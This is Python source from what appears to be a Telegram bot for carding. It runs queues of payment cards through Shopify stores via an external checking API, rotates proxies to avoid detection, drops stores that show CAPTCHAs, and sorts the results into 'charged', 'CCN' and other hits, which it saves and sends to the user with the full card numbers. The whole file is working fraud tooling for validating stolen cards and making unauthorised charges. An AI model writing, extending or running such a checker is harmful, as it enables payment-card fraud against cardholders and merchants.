# ==================== MSH - EXTERNAL SHOPIFY ENDPOINT CHECKER ====================
# Uses external Shopify API endpoint for FASTER checking (pre-extracted endpoints)
# Difference from /shcheck:
#   - /shcheck: Does full checkout flow locally (add to cart -> checkout -> payment)
#   - /msh: Uses pre-built external API with extracted Shopify endpoints (faster)

# Default API endpoint (can be changed with /setmshapi)
MSH_API_BASE = os.environ.get("MSH_API_URL", "https://shopi-production-7ef9.up.railway.app/")
user_msh_stats = {}  # {user_id: stats_dict} for MSH
user_msh_api = {}  # {user_id: custom_api_url} for per-user API endpoints

async def msh_check_card(cc, site_url, proxy_url=None, timeout=45, api_base=None):
    """
    Check a card using the external Shopify endpoint API.
    Returns: (response_type, full_response)
    response_type: 'charged', 'approved', 'ccn', 'insufficient', 'declined', 'error',
                   'site_dead', 'captcha', 'proxy_dead'
    """
    try:
        # Use custom API base or default
        base_url = api_base or MSH_API_BASE
        if not base_url.endswith('/'):
            base_url += '/'
        
        # Format: cc=5196032154986133|07|27|000
        # Build URL with params
        params = {
            'cc': cc,
            'url': site_url,
            'proxy': proxy_url or ''
        }
        
        url = f"{base_url}?cc={params['cc']}&url={params['url']}&proxy={params['proxy']}"
        
        connector = aiohttp.TCPConnector(ssl=False, limit=5)
        timeout_obj = aiohttp.ClientTimeout(total=timeout)
        
        async with aiohttp.ClientSession(connector=connector, timeout=timeout_obj) as session:
            async with session.get(url) as resp:
                if resp.status == 200:
                    # Try to parse JSON
                    try:
                        data = await resp.json()
                    except Exception as json_err:
                        # API returned non-JSON (probably HTML error page)
                        text = await resp.text()
                        log(f"[MSH] API returned non-JSON: {text[:100]}", "ERROR")
                        return 'error', {'Response': 'API_INVALID_RESPONSE', 'CC': cc}
                    
                    response_msg = data.get('Response', '')
                    
                    # Parse response - ORDER MATTERS! Check specific patterns first
                    response_upper = response_msg.upper()
                    response_lower = response_msg.lower()
                    
                    # ===== SITE/PROXY ISSUES (check first!) =====
                    
                    # CAPTCHA REQUIRED - Site needs captcha, should be removed
                    if 'CAPTCHA' in response_upper:
                        return 'captcha', data
                    
                    # SITE DEAD - Site is down/broken
                    elif 'SITE DEAD' in response_upper or 'SITE_DEAD' in response_upper:
                        return 'site_dead', data
                    
                    # PROXY DEAD - Proxy not working
                    elif 'PROXY DEAD' in response_upper or 'PROXY_DEAD' in response_upper or 'proxy dead' in response_lower:
                        return 'proxy_dead', data
                    
                    # ===== CARD RESULTS =====
                    
                    # CHARGED - Order completed successfully
                    elif 'order completed' in response_lower or 'success' in response_lower:
                        return 'charged', data
                    
                    # 3DS - Authentication required (still LIVE)
                    elif '3DS' in response_upper or '3D_SECURE' in response_upper or 'authenticate' in response_lower:
                        return 'approved', data
                    
                    # INSUFFICIENT FUNDS - Card is live but no money
                    elif 'insufficient' in response_lower or 'not enough' in response_lower:
                        return 'insufficient', data
                    
                    # CCN - Card is LIVE but CVV is wrong (only CVC/security code errors!)
                    elif 'incorrect_cvc' in response_lower or 'invalid_cvc' in response_lower:
                        return 'ccn', data
                    elif 'cvc_check' in response_lower and 'fail' in response_lower:
                        return 'ccn', data
                    elif 'security_code' in response_lower and ('invalid' in response_lower or 'incorrect' in response_lower):
                        return 'ccn', data
                    
                    # AVS Issue = Card is LIVE (address verification failed but card exists)
                    elif 'avs' in response_lower and ('issue' in response_lower or 'fail' in response_lower or 'mismatch' in response_lower):
                        return 'approved', data
                    
                    # DECLINED - Various decline reasons
                    elif 'DECLINED' in response_upper or 'CARD_DECLINED' in response_upper:
                        return 'declined', data
                    elif 'do_not_honor' in response_lower or 'do not honor' in response_lower:
                        return 'declined', data
                    elif 'lost' in response_lower or 'stolen' in response_lower:
                        return 'declined', data
                    elif 'expired' in response_lower:
                        return 'declined', data
                    elif 'pickup' in response_lower or 'fraud' in response_lower:
                        return 'declined', data
                    # INCORRECT_NUMBER = Card number is invalid (NOT CCN!)
                    elif 'INCORRECT_NUMBER' in response_upper or 'incorrect number' in response_lower:
                        return 'declined', data
                    elif 'invalid_number' in response_lower:
                        return 'declined', data
                    
                    # Generic decline patterns
                    elif any(kw in response_lower for kw in ['deny', 'reject', 'blocked', 'restricted']):
                        return 'declined', data
                    
                    # INVALID CARD - treat as declined
                    elif 'invalid' in response_lower and 'card' in response_lower:
                        return 'declined', data
                    
                    # If nothing matched, check if it looks like an error
                    elif 'error' in response_lower or 'fail' in response_lower:
                        return 'error', data
                    
                    # Unknown response - log it and return as error
                    else:
                        log(f"[MSH] Unknown response: {response_msg}", "WARNING")
                        return 'error', data
                        
                elif resp.status == 429:
                    return 'error', {'Response': 'RATE_LIMITED', 'CC': cc}
                elif resp.status >= 500:
                    return 'error', {'Response': f'API_DOWN_{resp.status}', 'CC': cc}
                else:
                    return 'error', {'Response': f'HTTP_{resp.status}', 'CC': cc}
                    
    except asyncio.TimeoutError:
        return 'error', {'Response': 'TIMEOUT', 'CC': cc}
    except aiohttp.ClientError as e:
        return 'error', {'Response': f'CONNECTION_ERROR', 'CC': cc}
    except Exception as e:
        log(f"[MSH] Exception: {str(e)[:50]}", "ERROR")
        return 'error', {'Response': str(e)[:30], 'CC': cc}


async def process_user_msh_cards(user_id, chat_id, specific_site=None, cancel_event=None, job_id=None):
    """
    Process cards using external Shopify endpoint API - MUCH FASTER than local checkout.
    
    Key difference from process_user_sh_cards:
    - Uses pre-extracted Shopify endpoints via external API
    - No local cart/checkout/payment session creation
    - Just sends card + site to API and gets immediate response
    - Much faster because heavy lifting is done by external service
    
    Features:
    - Rotates through user's Shopify sites
    - Uses user's proxies (converts to URL format for API)
    - Removes cards from queue as they're checked
    """
    check_id = f"MSH_{user_id}_{job_id or 'job'}"
    log(f"[{check_id}] ═══════════ STARTING MSH ENDPOINT CHECK ═══════════", "INFO")
    
    # Get cards, sites, proxies
    cards = await get_user_cards(user_id)
    proxies = await get_user_proxies(user_id)
    sites = await get_user_shopify_sites(user_id)
    
    if not cards:
        await safe_send_message(chat_id, "❌ No cards in your queue! Send cards first.")
        return
    
    # Build list of site URLs for rotation
    site_urls = []
    if specific_site:
        # Use only the specific site
        site_url = specific_site.strip()
        if not site_url.startswith('http'):
            site_url = 'https://' + site_url
        site_urls = [site_url]
    elif sites:
        # Build list from all saved sites
        for site in sites:
            if isinstance(site, dict):
                url = site.get('url', '')
            else:
                url = str(site)
            if url:
                if not url.startswith('http'):
                    url = 'https://' + url
                site_urls.append(url)
    
    if not site_urls:
        await safe_send_message(chat_id, "❌ No Shopify site configured! Use `/addsh <url>` first.", parse_mode='Markdown')
        return
    
    # Convert proxies to URL format for the external API
    # The API expects format: http://user:pass@host:port or http://host:port
    proxy_urls = []
    for proxy_data in proxies:
        proxy_url = None
        
        if isinstance(proxy_data, dict):
            # Standard parsed proxy dict
            proxy_url = get_proxy_url(proxy_data)
            
            # Also store raw for fallback
            if not proxy_url and proxy_data.get('raw'):
                # Try to use raw string if parsed version fails
                raw = proxy_data['raw']
                if '://' in raw:
                    proxy_url = raw
                elif ':' in raw:
                    # Basic host:port or host:port:user:pass format
                    parts = raw.split(':')
                    if len(parts) == 2:
                        proxy_url = f"http://{parts[0]}:{parts[1]}"
                    elif len(parts) >= 4:
                        host, port, user, passwd = parts[0], parts[1], parts[2], ':'.join(parts[3:])
                        proxy_url = f"http://{user}:{passwd}@{host}:{port}"
                        
        elif isinstance(proxy_data, str):
            # Raw string proxy
            raw = proxy_data.strip()
            if '://' in raw:
                # Already URL format
                proxy_url = raw
            elif '@' in raw:
                # user:pass@host:port format
                proxy_url = f"http://{raw}"
            elif raw.count(':') >= 3:
                # host:port:user:pass format
                parts = raw.split(':')
                host, port, user, passwd = parts[0], parts[1], parts[2], ':'.join(parts[3:])
                proxy_url = f"http://{user}:{passwd}@{host}:{port}"
            elif ':' in raw:
                # host:port format
                proxy_url = f"http://{raw}"
        
        if proxy_url:
            proxy_urls.append(proxy_url)
    
    use_proxy = len(proxy_urls) > 0
    
    if proxies and not proxy_urls:
        log(f"[MSH] Warning: {len(proxies)} proxies loaded but none converted to URL format!", "WARNING")
    else:
        log(f"[MSH] Converted {len(proxy_urls)} proxies to URL format", "DEBUG")
    
    # Dedup cards
    seen = set()
    unique_cards = []
    for c in cards:
        key = c.strip()
        if key and key not in seen:
            seen.add(key)
            unique_cards.append(key)
    cards = unique_cards
    
    if not cards:
        await safe_send_message(chat_id, "❌ No valid cards after deduplication.")
        return
    
    # Initialize stats
    if user_id not in user_msh_stats:
        user_msh_stats[user_id] = {"total": 0, "charged": 0, "approved": 0, "ccn": 0, "insufficient": 0, "declined": 0, "errors": 0}
    
    stats = user_msh_stats[user_id]
    
    # Get user's custom API endpoint (if set)
    user_api_base = user_msh_api.get(user_id, MSH_API_BASE)
    
    # Calculate effective parallel for display
    max_parallel = GLOBAL_MSH_BATCH_SIZE
    if use_proxy:
        effective_parallel = min(max_parallel, len(proxy_urls))
    else:
        effective_parallel = min(max_parallel, 10)
    effective_parallel = max(1, effective_parallel)
    
    # Start message
    proxy_display = f"{len(proxy_urls)} proxies" if use_proxy else "No proxy"
    sites_display = f"{len(site_urls)} sites" if len(site_urls) > 1 else f"`{site_urls[0][:30]}...`"
    api_display = "Custom API" if user_id in user_msh_api else "Default API"
    
    # Estimate speed
    est_speed = effective_parallel * 2  # ~2 cards per second per connection
    est_time = len(cards) / est_speed if est_speed > 0 else 0
    est_time_str = f"{int(est_time // 60)}m {int(est_time % 60)}s" if est_time > 60 else f"{int(est_time)}s"
    
    start_msg = f"""
⚡ {bold_sans("MSH ENDPOINT CHECK")} ⚡
━━━━━━━━━━━━━━━━━━━━━━━
📋 Cards: *{len(cards)}*
🌐 Sites: *{sites_display}*
🔒 Proxies: *{proxy_display}*
⚡ Parallel: *{effective_parallel}x* connections
🔗 API: *{api_display}*
⏱️ Est: *~{est_time_str}*
━━━━━━━━━━━━━━━━━━━━━━━

_Checking {effective_parallel} cards at once..._
"""
    await safe_send_message(chat_id, start_msg, parse_mode='Markdown')
    
    # Initialize counter
    counter = LiveCounter(len(cards), chat_id, "MSH Endpoint")
    await counter.update(force=True)
    
    processed = 0
    batch_hits = []
    
    # ===== PARALLEL BATCH SIZE =====
    # Use global MSH batch setting (owner-controlled via /parallelmsh)
    # Effective batch = min(setting, sites, proxies)
    max_parallel = GLOBAL_MSH_BATCH_SIZE
    
    if use_proxy:
        # Can't do more parallel than we have proxies
        effective_parallel = min(max_parallel, len(proxy_urls))
    else:
        # Without proxies, limit to avoid rate limiting
        effective_parallel = min(max_parallel, 10)
    
    # Also consider sites - rotate through all of them
    if len(site_urls) < effective_parallel:
        # Will reuse sites for higher parallelism
        log(f"[{check_id}] Sites: {len(site_urls)} < parallel: {effective_parallel} (sites will be reused)", "INFO")
    
    batch_size = max(1, effective_parallel)
    
    log(f"[{check_id}] ┌─────────────────────────────────────────────┐", "INFO")
    log(f"[{check_id}] │ 📋 Cards: {len(cards):<10} 🌐 Sites: {len(site_urls):<10} │", "INFO")
    log(f"[{check_id}] │ 🔒 Proxies: {len(proxy_urls):<8} ⚡ Parallel: {batch_size:<8} │", "INFO")
    log(f"[{check_id}] │ 🔗 API: {user_api_base[:30]:<30}...│", "INFO")
    log(f"[{check_id}] └─────────────────────────────────────────────┘", "INFO")
    
    user_dir = get_user_dir(user_id)
    
    # ===== SITE/PROXY QUALITY TRACKING =====
    # Track errors per site/proxy to auto-remove bad ones
    site_errors = {}  # {site_url: error_count}
    proxy_errors = {}  # {proxy_url: error_count}
    removed_sites = set()  # Sites removed due to captcha/dead
    removed_proxies = set()  # Proxies removed due to being dead
    MAX_SITE_ERRORS = 1  # Remove site IMMEDIATELY on first CAPTCHA/DEAD error
    MAX_PROXY_ERRORS = 2  # Remove proxy after X errors
    
    # Cards to retry on different site/proxy
    retry_queue = []
    
    # Working copies of sites/proxies (will remove bad ones)
    working_sites = list(site_urls)
    working_proxies = list(proxy_urls) if use_proxy else []
    
    # Site and proxy rotation indices
    site_idx = 0
    proxy_idx = 0
    
    async def get_next_site():
        """Get next working site, skipping removed ones"""
        nonlocal site_idx
        if not working_sites:
            return None
        site = working_sites[site_idx % len(working_sites)]
        site_idx += 1
        return site
    
    async def get_next_proxy():
        """Get next working proxy, skipping removed ones"""
        nonlocal proxy_idx
        if not working_proxies:
            return None
        proxy = working_proxies[proxy_idx % len(working_proxies)]
        proxy_idx += 1
        return proxy
    
    async def mark_site_error(site, error_type):
        """Track site error and remove if too many - PERMANENTLY removes from user's saved list"""
        nonlocal working_sites
        site_errors[site] = site_errors.get(site, 0) + 1
        log(f"[{check_id}] 🚨 Site error #{site_errors[site]} ({error_type}): {site[:50]}", "WARNING")
        
        if site_errors[site] >= MAX_SITE_ERRORS and site in working_sites:
            # Remove from working list immediately
            working_sites.remove(site)
            removed_sites.add(site)
            log(f"[{check_id}] ⛔ REMOVING SITE from session: {site[:50]}", "WARNING")
            
            # PERMANENTLY remove from user's saved Shopify sites
            try:
                removed_ok, _ = await remove_user_shopify_site_by_url(user_id, site)
                if removed_ok:
                    log(f"[{check_id}] 🗑️ PERMANENTLY removed from DB: {site[:50]}", "INFO")
                else:
                    log(f"[{check_id}] ⚠️ Site not found in DB (already removed?): {site[:50]}", "WARNING")
            except Exception as e:
                log(f"[{check_id}] ❌ Failed to remove site from DB: {e}", "ERROR")
            
            # Notify user
            site_short = site.replace('https://', '').replace('http://', '')[:35]
            await safe_send_message(chat_id, f"🗑️ *Removed site* ({error_type}):\n`{site_short}`\n_Permanently removed from your list_", parse_mode='Markdown')
    
    async def mark_proxy_error(proxy):
        """Track proxy error and remove if dead - PERMANENTLY removes from user's saved list"""
        nonlocal working_proxies
        proxy_errors[proxy] = proxy_errors.get(proxy, 0) + 1
        # Mask proxy for display
        proxy_display = proxy.split('@')[-1] if '@' in proxy else proxy[:30]
        log(f"[{check_id}] 🚨 Proxy error #{proxy_errors[proxy]}: {proxy_display}", "WARNING")
        
        if proxy_errors[proxy] >= MAX_PROXY_ERRORS and proxy in working_proxies:
            working_proxies.remove(proxy)
            removed_proxies.add(proxy)
            log(f"[{check_id}] ⛔ REMOVING PROXY from session: {proxy_display}", "WARNING")
            
            # PERMANENTLY remove from user's saved proxies
            try:
                # Find and remove the proxy from user's list
                current_proxies = await get_user_proxies(user_id)
                # Find proxy by URL match
                updated_proxies = []
                removed_count = 0
                for p in current_proxies:
                    p_url = get_proxy_url(p) if isinstance(p, dict) else p
                    if p_url != proxy:
                        updated_proxies.append(p)
                    else:
                        removed_count += 1
                if removed_count > 0:
                    await save_user_proxies(user_id, updated_proxies)
                    log(f"[{check_id}] 🗑️ PERMANENTLY removed proxy from DB: {proxy_display}", "INFO")
                else:
                    log(f"[{check_id}] ⚠️ Proxy not found in DB (already removed?): {proxy_display}", "WARNING")
            except Exception as e:
                log(f"[{check_id}] ❌ Failed to remove proxy from DB: {e}", "ERROR")
            
            await safe_send_message(chat_id, f"🗑️ *Removed dead proxy*: `{proxy_display}`\n_Permanently removed from your list_", parse_mode='Markdown')
    
    for i in range(0, len(cards), batch_size):
        # Check for cancellation
        if cancel_event and cancel_event.is_set():
            log(f"[{check_id}] Cancelled by user", "WARNING")
            break
        
        # Check if we have any working sites left
        if not working_sites:
            await safe_send_message(chat_id, "❌ All sites removed (captcha/dead). Stopping check.", parse_mode='Markdown')
            break
        
        # Check if we need proxies but have none left
        if use_proxy and not working_proxies:
            await safe_send_message(chat_id, "⚠️ All proxies dead! Continuing without proxy...", parse_mode='Markdown')
            use_proxy = False
        
        batch = cards[i:i+batch_size]
        tasks = []
        task_info = []  # Store (card, site, proxy) for each task
        
        for idx, card_line in enumerate(batch):
            # Get next working site
            current_site = await get_next_site()
            if not current_site:
                break
            
            # Get next working proxy
            current_proxy = await get_next_proxy() if use_proxy else None
            
            # Create task with user's API endpoint
            task = msh_check_card(card_line, current_site, current_proxy, api_base=user_api_base)
            tasks.append((card_line, task))
            task_info.append((card_line, current_site, current_proxy))
        
        if not tasks:
            break
        
        # Execute batch concurrently
        results = await asyncio.gather(*[t[1] for t in tasks], return_exceptions=True)
        
        for (card_line, _), result, (_, used_site, used_proxy) in zip(tasks, results, task_info):
            processed += 1
            stats['total'] += 1
            
            if isinstance(result, Exception):
                stats['errors'] += 1
                result_type = 'error'
                response_data = {'Response': str(result)[:50], 'CC': card_line}
            else:
                result_type, response_data = result
            
            # Process result
            cc = response_data.get('CC', card_line)
            resp_msg = response_data.get('Response', 'Unknown')
            price = response_data.get('Price', 'N/A')
            gate = response_data.get('Gate', 'Shopify')
            site_used = response_data.get('Site', used_site[:40] if used_site else 'Unknown')
            
            masked_cc = card_line[:6] + 'x' * 6 + card_line[-4:] if len(card_line) >= 16 else card_line[:10] + '...'
            
            # ===== LOG EACH CARD RESULT (JSON format) =====
            log(f"[{check_id}] ┌── Card #{processed}/{len(cards)} ──", "INFO")
            log(f"[{check_id}] │ Response: {resp_msg}", "INFO")
            log(f"[{check_id}] │ CC: {masked_cc}", "INFO")
            log(f"[{check_id}] │ Price: ${price} | Gate: {gate}", "INFO")
            log(f"[{check_id}] │ Site: {site_used[:50]}", "INFO")
            log(f"[{check_id}] │ Result: {result_type.upper()}", "INFO")
            log(f"[{check_id}] └────────────────────", "INFO")
            
            # ===== HANDLE SITE/PROXY ERRORS (re-queue card) =====
            if result_type == 'captcha':
                await mark_site_error(used_site, "CAPTCHA")
                retry_queue.append(card_line)  # Re-queue card for retry
                stats['errors'] += 1
                counter.errors += 1
                # Don't remove from queue yet - will retry
                continue
                
            elif result_type == 'site_dead':
                await mark_site_error(used_site, "DEAD")
                retry_queue.append(card_line)  # Re-queue card for retry
                stats['errors'] += 1
                counter.errors += 1
                continue
                
            elif result_type == 'proxy_dead':
                if used_proxy:
                    await mark_proxy_error(used_proxy)
                retry_queue.append(card_line)  # Re-queue card for retry
                stats['errors'] += 1
                counter.errors += 1
                continue
            
            # ===== HANDLE CARD RESULTS WITH LOGGING =====
            if result_type == 'charged':
                stats['charged'] += 1
                counter.live += 1
                counter.charged += 1
                log(f"[{check_id}] 💎 CHARGED: {masked_cc} | ${price} | {gate}", "SUCCESS")
                # Save to file
                async with aiofiles.open(os.path.join(user_dir, "msh_charged.txt"), 'a') as f:
                    await f.write(f"{card_line} | {gate} | ${price}\n")
                # Add to hits history
                await append_to_hit_history(user_id, card_line, "CHARGED", "shopify", source_chat_id=chat_id)
                batch_hits.append(card_line)
                # Send hit notification
                hit_msg = f"""
💎 {bold_sans("MSH CHARGED")} 💎
━━━━━━━━━━━━━━━━━
💳 `{card_line}`
💰 Price: *${price}*
🏪 Gate: *{gate}*
━━━━━━━━━━━━━━━━━
"""
                sent = await safe_send_message(chat_id, hit_msg, parse_mode='Markdown')
                log(f"[{check_id}] 📤 Hit notification sent: {sent}", "INFO")
                
            elif result_type == 'approved':
                stats['approved'] += 1
                counter.live += 1
                log(f"[{check_id}] ✨ APPROVED (3DS): {masked_cc} | ${price}", "SUCCESS")
                async with aiofiles.open(os.path.join(user_dir, "msh_approved.txt"), 'a') as f:
                    await f.write(f"{card_line} | {gate} | ${price} | 3DS\n")
                await append_to_hit_history(user_id, card_line, "APPROVED", "shopify", source_chat_id=chat_id)
                batch_hits.append(card_line)
                hit_msg = f"""
✨ {bold_sans("MSH APPROVED (3DS)")} ✨
━━━━━━━━━━━━━━━━━
💳 `{card_line}`
💰 Price: *${price}*
🏪 Gate: *{gate}*
━━━━━━━━━━━━━━━━━
"""
                sent = await safe_send_message(chat_id, hit_msg, parse_mode='Markdown')
                log(f"[{check_id}] 📤 3DS notification sent: {sent}", "INFO")
                
            elif result_type == 'ccn':
                stats['ccn'] += 1
                counter.live += 1
                log(f"[{check_id}] 🔢 CCN (Wrong CVV): {masked_cc} | {resp_msg}", "SUCCESS")
                async with aiofiles.open(os.path.join(user_dir, "msh_ccn.txt"), 'a') as f:
                    await f.write(f"{card_line} | {resp_msg}\n")
                await append_to_hit_history(user_id, card_line, "CCN", "shopify", source_chat_id=chat_id)
                batch_hits.append(card_line)
                # CCN = Live card with wrong CVV - still a hit!
                hit_msg = f"""
🔢 {bold_sans("MSH CCN (Wrong CVV)")} 🔢
━━━━━━━━━━━━━━━━━
💳 `{card_line}`
📝 Response: *{resp_msg[:30]}*
🏪 Gate: *{gate}*
━━━━━━━━━━━━━━━━━
_Card is LIVE but CVV is wrong_
"""
                sent = await safe_send_message(chat_id, hit_msg, parse_mode='Markdown')
                log(f"[{check_id}] 📤 CCN notification sent: {sent}", "INFO")
                    
            elif result_type == 'insufficient':
                stats['insufficient'] += 1
                counter.live += 1
                log(f"[{check_id}] 💸 INSUFFICIENT: {masked_cc} | {gate}", "SUCCESS")
                async with aiofiles.open(os.path.join(user_dir, "msh_insufficient.txt"), 'a') as f:
                    await f.write(f"{card_line} | {resp_msg}\n")
                await append_to_hit_history(user_id, card_line, "INSUFFICIENT", "shopify", source_chat_id=chat_id)
                batch_hits.append(card_line)
                hit_msg = f"""
💸 {bold_sans("MSH INSUFFICIENT")} 💸
━━━━━━━━━━━━━━━━━
💳 `{card_line}`
🏪 Gate: *{gate}*
━━━━━━━━━━━━━━━━━
"""
                sent = await safe_send_message(chat_id, hit_msg, parse_mode='Markdown')
                log(f"[{check_id}] 📤 Insufficient notification sent: {sent}", "INFO")
                
            elif result_type == 'declined':
                stats['declined'] += 1
                counter.declined += 1
                
            else:  # error
                stats['errors'] += 1
                counter.errors += 1
            
            # Remove card from queue (only for actual card results, not site/proxy errors)
            try:
                current_cards = await get_user_cards(user_id)
                if card_line in current_cards:
                    current_cards.remove(card_line)
                    await save_user_cards(user_id, current_cards)
            except:
                pass
            
            # Update counter
            counter.processed = processed
            await counter.update()
        
        # Log batch progress every batch
        live_count = stats['charged'] + stats['approved'] + stats['ccn'] + stats['insufficient']
        pct = int(100 * processed / len(cards)) if len(cards) > 0 else 0
        elapsed = time.time() - counter.start_time
        cpm = int(processed / (elapsed / 60)) if elapsed > 0 else 0
        log(f"[{check_id}] 📊 {processed}/{len(cards)} ({pct}%) | 💎 {stats['charged']} charged | ✨ {stats['approved']} 3DS | 🟢 {live_count} live | ❌ {stats['declined']} dead | ⚡ {cpm} cc/min", "INFO")
    
    # Process retry queue (cards that failed due to site/proxy issues)
    if retry_queue and working_sites:
        log(f"[{check_id}] Processing {len(retry_queue)} retries", "INFO")
        await safe_send_message(chat_id, f"🔄 Retrying {len(retry_queue)} cards on working sites...", parse_mode='Markdown')
        
        for card_line in retry_queue[:50]:  # Limit retries
            if not working_sites:
                break
            
            current_site = await get_next_site()
            current_proxy = await get_next_proxy() if (use_proxy and working_proxies) else None
            
            result_type, response_data = await msh_check_card(card_line, current_site, current_proxy, api_base=user_api_base)
            
            # Skip site/proxy errors on retry (don't infinite loop)
            if result_type in ('captcha', 'site_dead', 'proxy_dead'):
                stats['errors'] += 1
                continue
            
            # Process result same as above (simplified)
            if result_type == 'charged':
                stats['charged'] += 1
                await append_to_hit_history(user_id, card_line, "CHARGED", "shopify", source_chat_id=chat_id)
                batch_hits.append(card_line)
            elif result_type == 'approved':
                stats['approved'] += 1
                await append_to_hit_history(user_id, card_line, "APPROVED", "shopify", source_chat_id=chat_id)
                batch_hits.append(card_line)
            elif result_type == 'declined':
                stats['declined'] += 1
            else:
                stats['errors'] += 1
            
            # Remove from queue
            try:
                current_cards = await get_user_cards(user_id)
                if card_line in current_cards:
                    current_cards.remove(card_line)
                    await save_user_cards(user_id, current_cards)
            except:
                pass
    
    # Finish counter
    await counter.finish()
    
    # Summary with removed sites/proxies info
    live = stats['charged'] + stats['approved'] + stats['insufficient'] + stats['ccn']
    
    # Build quality report
    quality_report = ""
    if removed_sites:
        quality_report += f"\n🚫 Sites removed: *{len(removed_sites)}* (captcha/dead)"
    if removed_proxies:
        quality_report += f"\n💀 Proxies removed: *{len(removed_proxies)}* (dead)"
    if retry_queue:
        quality_report += f"\n🔄 Cards retried: *{len(retry_queue)}*"
    
    summary = f"""
✅ {bold_sans("MSH CHECK COMPLETE")}
━━━━━━━━━━━━━━━━━━━━━━━

📊 *Results:*
• Total: {stats['total']}
• 💎 Charged: {stats['charged']}
• ✨ Approved (3DS): {stats['approved']}
• 🔶 CCN: {stats['ccn']}
• 💸 Insufficient: {stats['insufficient']}
• ❌ Declined: {stats['declined']}
• ⚠️ Errors: {stats['errors']}

🟢 *LIVE: {live}*
{quality_report}
━━━━━━━━━━━━━━━━━━━━━━━
_Sites/proxies auto-removed on failure_
"""
    await safe_send_message(chat_id, summary, parse_mode='Markdown')
    
    # Generate hitkey if hits
    if batch_hits:
        hitkey = await generate_hitkey(user_id, batch_hits)
        if hitkey:
            hitkey_msg = f"\n🔑 *Hitkey:* `{hitkey}`\nUse `/gethits {hitkey}` to retrieve"
            await safe_send_message(chat_id, hitkey_msg, parse_mode='Markdown')


